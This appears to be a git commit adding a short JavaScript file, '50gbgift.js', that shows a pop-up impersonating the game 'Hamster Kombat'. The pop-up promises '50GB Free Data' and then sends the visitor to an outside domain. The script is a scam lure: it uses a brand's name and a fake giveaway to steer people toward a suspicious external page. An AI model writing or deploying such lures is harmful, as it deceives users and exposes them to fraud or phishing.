17b2f7aaea7ecfdee82baa72d33c165a6b1382bd
bigetijazz4 <bigetijazz4@gmail.com>
2024-06-19 01:35:06 -0700

    Create 50gbgift.js

---
+++ 50gbgift.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Hamster Kombat: Hello Dear, Hamster is giving away 50GB Free Data to everyone to claim your 50GB, press 1 to claim now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/tapswap.html';
+}
